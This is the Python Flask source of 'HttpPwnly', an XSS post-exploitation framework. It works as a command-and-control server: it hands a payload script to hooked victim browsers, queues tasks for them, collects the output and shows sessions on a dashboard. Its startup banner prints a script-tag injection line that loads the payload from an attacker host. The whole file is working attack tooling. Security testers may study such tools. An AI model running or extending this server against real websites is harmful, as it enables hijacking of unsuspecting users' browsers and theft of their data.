#!/usr/bin/python
from flask import Flask, jsonify, abort, make_response, g, request
from flask.ext.cors import CORS
import sqlite3
from flask_sqlalchemy import SQLAlchemy
from collections import OrderedDict
import sys

PORT = 9999 #default, overridden by sys.argv[1]
if len(sys.argv)>1:
    PORT = int(sys.argv[1])
print "\nWelcome to HttpPwnly - An XSS Post-Exploitation Framework!\n"
print "The framework defaults to running on port 9999, but you can change this by launching with a different port as the first arg: ./httppwnly.py [port]\n\n"
print "Include the following script element in a page in order to hook into the framework:"
print "<script id=\"hacker\" src=\"http://[attackers_ip]:"+str(PORT)+"/payload.js\"></script>\n\n"
print "Visit http://[attackers_ip]:"+str(PORT)+"/dashboard and wait for incoming sessions!"
raw_input("Press Enter to continue...")
DATABASE = 'tasks.db'
app = Flask(__name__)
cors = CORS(app)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=False)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'), primary_key=True)
    input = db.Column(db.Text)
    output = db.Column(db.Text)
    status = db.Column(db.Text)
    
    client = db.relationship('Client',
        backref=db.backref('tasks', lazy='dynamic'))
    def __init__(self, client, id,  input, output=None):
        self.id = id
        self.client = client
        self.input = input
        self.output = output
        self.status= "new"
    def __repr__(self):
        return '<Task %r>' % self.id
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    def __repr__(self):
        return '<Client %r>' % self.id 
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result
db.drop_all()
db.create_all()
@app.route('/payload.js', methods=['GET'])
def returnJS():
    return open("payload.js").read()
    
@app.route('/api/register', methods=['GET'])
def register():
    myclient = Client()
    db.session.add(myclient)
    db.session.commit()
    print '[*] registering client: '+str(myclient.id)
    return jsonify({'clientid': myclient.id}), 201
    

@app.route('/api/tasks/<int:client_id>', methods=['GET'])
def gettasks(client_id):
    print '[*] sending tasks for client ID: '+str(client_id)
    myclient = Client.query.filter_by(id=client_id).first()
    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None),Task.status.is_("new")).all() #select all tasks which have no output, that are the the "new" state (not "inprogress")
    tasks = []
    for task in tasklist:
        tasks.append({'id':task.id,'input':task.input})
        task.status="inprogress"
        db.session.commit()        
    return jsonify({'tasks': tasks}), 201 

@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['POST'])
def recievetasks(client_id,task_id):
    if not request.json:
        abort(400)

    for task in request.json['tasks']:
        myclient = Client.query.filter_by(id=client_id).first()
        mytask = Task.query.filter_by(client=myclient,id=task_id).first()
        mytask.output=str(task['output'])
        mytask.status="complete"
        db.session.commit()
        print '[*] recieved output for clientid: '+str(client_id)+' taskid: '+str(task_id)

    return jsonify({'result': True}), 201
          
@app.route('/api/client/<int:cid>/task/add', methods=['POST']) #require auth eventually
def addtask(cid):
    if not request.json:
        abort(400)
    task = request.json['input']
    myclient = Client.query.filter_by(id=int(cid)).first()
    highesttaskid = Task.query.filter_by(client = myclient).order_by(Task.id.desc()).limit(1).all()
    #check if null, if null, taskid=1, else taskid = highesttaskid.id+1
    mytaskid=0
    if len(highesttaskid) == 0:
        mytaskid = 1
    else:
        mytaskid=highesttaskid[0].id+1
    
    mytask = Task(myclient,mytaskid,task) 
    db.session.add(mytask)
    db.session.commit()
    print '[*] Registered task id: '+str(mytask.id)

    return jsonify({'taskid': mytask.id}), 201

@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['GET']) #require auth eventually
def gettaskoutput(client_id,task_id):
    myclient = Client.query.filter_by(id=int(client_id)).first()
    mytask = Task.query.filter_by(client=myclient,id=task_id).first()
    return jsonify({'output': mytask.output}), 201
     
@app.route('/api/tasks/list', methods=['GET'])
def getTaskList():
    dblist = {"clients":[]}
    clientlist = Client.query.all()
    for client in clientlist:
        client_tasks = Task.query.filter_by(client_id=int(client.id)).all()
        temparr = []
        for task in client_tasks:
            temparr.append({"realtaskid":task.id,"input":task.input,"output":task.output})
        dblist['clients'].append({"id":client.id,"tasks":temparr})
    print dblist
    return jsonify(dblist), 201

@app.route('/api/clients/list', methods=['GET']) #require auth eventually
def getClientList():
    iddb = []
    clientlist = Client.query.all()
    for client in clientlist:
        iddb.append(client.id)
    return jsonify({"clients":iddb}), 201 

@app.route('/api/client/<int:client_id>/tasks/poll', methods=['GET']) #require auth eventually
def pollTasks(client_id):
    #this function basically gets a complete list of tasks for a particular client and returns taskid,true/false depending on whether output exists for it
    myclient = Client.query.filter_by(id=int(client_id)).first()
    tasks = Task.query.with_entities(Task.id,Task.input,Task.output).filter(Task.client==myclient).all()
    
    tasklist = []
    for task in tasks:
        output = False
        if task.output:
            output = True
        tasklist.append({'id':task.id,'input':task.input,'output':output})
    print tasklist
    return jsonify({'tasks': tasklist}), 201
    
@app.route('/dashboard', methods=['GET']) #require auth eventually
def serveDash():
    return open("dashboard.html").read()
    
if __name__ == '__main__':
    app.run(debug=False,port=PORT)